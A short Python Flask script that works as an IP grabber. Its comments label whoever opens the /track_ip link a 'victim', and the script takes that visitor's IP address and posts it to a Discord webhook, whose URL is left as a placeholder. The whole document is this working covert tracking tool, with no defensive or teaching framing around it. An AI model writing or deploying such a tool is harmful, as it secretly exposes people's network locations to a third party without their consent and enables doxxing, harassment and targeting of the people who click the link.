from flask import Flask, request
import requests

app = Flask(__name__)

# Web server to receive the victim's IP address
@app.route('/track_ip', methods=['GET'])
def track_ip():
    victim_ip = request.remote_addr  # Get the IP address of the user who clicks
    discord_webhook_url = "https://discord.com/api/webhooks/your_webhook_url_here"
    payload = {
        "content": f"IP Address Exposed: {victim_ip}"
    }
    requests.post(discord_webhook_url, json=payload)  # Send the IP to the Discord webhook
    return "IP Logged and Sent to Discord!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
